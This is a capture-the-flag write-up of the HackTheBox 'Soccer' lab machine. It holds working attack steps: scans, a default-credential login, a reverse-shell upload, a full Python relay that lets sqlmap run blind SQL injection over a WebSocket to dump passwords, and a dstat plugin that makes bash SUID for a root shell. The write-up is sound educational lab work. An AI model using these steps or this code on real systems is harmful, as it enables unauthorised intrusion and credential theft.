   ![image](https://user-images.githubusercontent.com/87700008/209568214-13059ca8-21b0-4432-878a-613bce7c9ae0.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## **Enumeration:**

I started with quick rustscan, which gave me 3 open ports :

    sudo rustscan -a 10.10.11.194 -- -sC -sV -T4 -vv -oN soccer_nmap
    
    Open 10.10.11.194:22 --> OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    Open 10.10.11.194:80  --> nginx 1.18.0
    Open 10.10.11.194:9091  --> xmltec-xmlmail?
    
![image](https://user-images.githubusercontent.com/87700008/209568575-b6901fdf-1711-46a6-adf4-f51cc81e8c60.png)

Found a domain to resolve in the port scan results & added it to the hosts list, i.e. "http://soccer.htb"

![image](https://user-images.githubusercontent.com/87700008/209568773-bbec4b87-83cc-45b7-85fc-5f461bcd57fa.png)

Went to the website & found a regular page with very limited options :

![image](https://user-images.githubusercontent.com/87700008/209573968-b71a2436-351b-49ae-be3e-2869e368745e.png)
![image](https://user-images.githubusercontent.com/87700008/209573987-a8d60bf5-31f7-4db4-8dae-3b859d6a6e6e.png)

Next, I started scanning the website using gobuster for the subdomains & found only 1 subdomain in the result :

      gobuster dir -u http://soccer.htb -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o soccer -b 404,403 -k
      
      /tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]

![image](https://user-images.githubusercontent.com/87700008/209574154-23813b95-770e-4898-a2d3-9b0dec061e11.png)

I quickly checked the website & found a login panel in it, URL redirected me to another URL, i.e. "http://soccer.htb/tiny/tinyfilemanager.php"

![image](https://user-images.githubusercontent.com/87700008/209574206-1a91a307-3bfd-4bfd-bd6c-fd26dbee2107.png)

This looks like a some kind of file manager. I scanned this subdomain with the gobuster & found another subdomain :

      /uploads              (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/uploads/]
      
![image](https://user-images.githubusercontent.com/87700008/209574374-1687fd45-d4b2-452b-bf7e-80fdb19e3368.png)

I tried to access it but I need to login before accessing it as it showed 403 error 😕

![image](https://user-images.githubusercontent.com/87700008/209574724-fb3c57a6-54c8-47bf-97ff-5fb5670bed37.png)

I then moved back to the '/tiny' login page & checked for the source code & found that it's running on version 2.4.3

![image](https://user-images.githubusercontent.com/87700008/209574936-eb3044f6-ea5c-4656-bcaa-60baefeda7ea.png)

I checked for the exploits of 'tiny file manager 2.4' on google & found many refrences. Such as :

      Exploit DB : https://www.exploit-db.com/exploits/50828 (Tiny File Manager RCE <= 2.4.6)
      GitHub : https://github.com/febinrev/tinyfilemanager-2.4.3-exploit (Path traversal)
      
But both the exploit needs an authenticated user for the successfull exploit. So, I tried the different kind of SQL injection to check whether it's vulnerable to SQLi but no luck. 😕

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## **Initial access :**

Then I tried the default credentials for the file manager, i.e. 'admin' : 'admin@123' & it worked.🙂

When logged in found a file/website manager kind of page.

![image](https://user-images.githubusercontent.com/87700008/209575440-187c7121-2ed4-4536-8e81-f1ed1275ceab.png)

And now I can access the upload section as well.

![image](https://user-images.githubusercontent.com/87700008/209575549-dd34c181-f63d-445a-8918-b5c0d22b6546.png)

I stucked at this point as the exploit POC is not working as expected & it seems like I can't upload the data to the regular path.

![image](https://user-images.githubusercontent.com/87700008/209581350-83e8e96b-d088-43bb-9356-818a5d2e7dc1.png)
![image](https://user-images.githubusercontent.com/87700008/209581447-e62efb7e-1920-40cd-8637-3b13414d1ee2.png)

I tried other possible way to exploit path traversal vulnerability & LFI but no luck in all of them. I have to figure out the correct path to upload the file.
After searching for approx 2 hours I landed onto this page, where I observed that I can upload/write my files : http://soccer.htb/tiny/tinyfilemanager.php?p=tiny%2Fuploads&upload

I uploaded a PHP reverse shell & started listening on my kali machine, browsed on my uploaded file & catched the reverse shell.(pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/209581628-4ddafa8b-d05c-4b82-ab38-3032e67e5d27.png)

The shell is not stable so first thing I did is stablized the shell, using these coomands :

      python3 -c 'import pty;pty.spawn("/bin/bash")'
      export TERM=xterm
      stty raw -echo; fg
      
So, currently I am running as 'www-data' & there is another user directory present, i.e. 'player'. Player directory is having the user flag but I don't have access to it.

![image](https://user-images.githubusercontent.com/87700008/209581967-922a793c-9e44-45db-ac79-5f4dac792b8f.png)


While enumeration I found that there is some service running on port 9091 which we also observed during our port scan & also 3306 which runs MySQL usually.

![image](https://user-images.githubusercontent.com/87700008/209657524-a853f776-077b-41d2-98ad-4dd6e04d0338.png)

Then in this location '/etc/nginx/sites-available/soc-player.htb' I found that there is another host running with the server, i.e. 'soc-player.soccer.htb'

![image](https://user-images.githubusercontent.com/87700008/209658715-582fa553-900f-4b51-96fc-af1115127924.png)

Quickly added the domain to host list & browsed it. Observed that this website is bit different from the previous one as it has some extra functionality like : login, singup, etc.

![image](https://user-images.githubusercontent.com/87700008/209658917-f0ac6de0-df28-497c-b771-db3b97103766.png)

I quickly created an account & logged into the website.

![image](https://user-images.githubusercontent.com/87700008/209659221-e980f501-2747-41bd-8fbb-c2f82d4e58f6.png)

After logging in I am at the page 'http://soc-player.soccer.htb/check' & looking at the html source code of the page I found that it is having some ticket checking functionality running on port '**9091**' with some kind of websocket.

![image](https://user-images.githubusercontent.com/87700008/209659991-9cc66be7-d7b7-49e9-977f-57dd5419984c.png)

After searching for a while I found this blog for 'Blind SQL injection over WebSocket', ref : https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

Where the author described & shared a script to perform Blind SQLi, combining with SQLmap & retrieve the data from the database.

Here is the script which I coped from the blog :

        from http.server import SimpleHTTPRequestHandler
        from socketserver import TCPServer
        from urllib.parse import unquote, urlparse
        from websocket import create_connection
        
        ws_server = "ws://soc-player.soccer.htb:9091"  #changed the paramter here as per our target.
        
        def send_ws(payload):
            ws = create_connection(ws_server)
            # If the server returns a response on connect, use below line   
            #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
            
            # For our case, format the payload in JSON
            message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
            data = '{"id":"%s"}' % message
        
            ws.send(data)
            resp = ws.recv()
            ws.close()
        
            if resp:
                return resp
            else:
                return ''
        
        def middleware_server(host_port,content_type="text/plain"):
        
            class CustomHandler(SimpleHTTPRequestHandler):
                def do_GET(self) -> None:
                    self.send_response(200)
                    try:
                        payload = urlparse(self.path).query.split('=',1)[1]
                    except IndexError:
                        payload = False
                        
                    if payload:
                        content = send_ws(payload)
                    else:
                        content = 'No parameters specified!'
        
                    self.send_header("Content-type", content_type)
                    self.end_headers()
                    self.wfile.write(content.encode())
                    return
        
            class _TCPServer(TCPServer):
                allow_reuse_address = True
        
            httpd = _TCPServer(host_port, CustomHandler)
            httpd.serve_forever()
        
        
        print("[+] Starting MiddleWare Server")
        print("[+] Send payloads in http://localhost:8081/?id=*")
        
        try:
            middleware_server(('0.0.0.0',8081))
        except KeyboardInterrupt:
            pass

Saved the script in 'sqli.py' & executed it & in the other terminal ran the SQLmap.

      python3 sqli.py --> In 1st terminal
      
      sqlmap -u "http://localhost:8081/?id=5" --batch --dbs --dump --> In 2nd terminal
      
![image](https://user-images.githubusercontent.com/87700008/209700819-3ecc1390-4777-4be8-938c-a8b0c09f4c4c.png)

It took some time but I got the database with the password of the user 'player'

![image](https://user-images.githubusercontent.com/87700008/209700874-a5cb9351-8f12-45c3-9d66-eed8a8521ccb.png)
![image](https://user-images.githubusercontent.com/87700008/209700969-4c733c3a-7c62-4af6-b653-b54192de42fe.png)

I then logged in with the new password via SSH & got the user flag. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/209701218-863a722e-8e85-4e6e-8dd3-4452971f5a09.png)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## **Priv Esc** :
      
I started with the manual enumeration & check the permissions to run SUID binaries, I got an un-usual file in the list 'doas' :

      find / -perm -4000 2>/dev/null
      
![image](https://user-images.githubusercontent.com/87700008/209710015-9b5ea856-ee25-4e2d-9948-692fb2064f49.png)

I searched & checked for the file configuration of doas & found 'player' can run 'dstat' as root.

![image](https://user-images.githubusercontent.com/87700008/209710182-8824b280-70c2-4ed2-ad74-12c463d57dc5.png)

I checked a way for exploit the 'dstat' to get root privilege & landed onto this blog : https://exploit-notes.hdks.org/exploit/sudo-privilege-escalation/

As per the blog :

      "dstat is a versatile tool for generating system resource statistics. It allows users to create a custom plugin and execute by adding option e.g. dstat--myplugin."
      
![image](https://user-images.githubusercontent.com/87700008/209711020-f2f4f579-5574-4a87-93bf-1799ebb810ce.png)

So, for the exploitation I created a file name- "dstat_exploit.py" in the location "/usr/local/share/dstat".
      
      In the dstat_exploit.py:
      
      import os
      
      os.system('chmod +s /usr/bin/bash')

Next I checked whether the above exploit is added as a plugin or not using this :

      dstat --list | grep exploit
      
Then executed the dstat with --exploit flag as a root user :

      doas -u root /usr/bin/dstat --exploit
      
In the end I executed 'bash -p' which gave me root shell & I got the root flag. (pwn3d!🙂)

![image](https://user-images.githubusercontent.com/87700008/209711575-4dece7c0-fbe7-44e4-a766-7a04499de450.png)
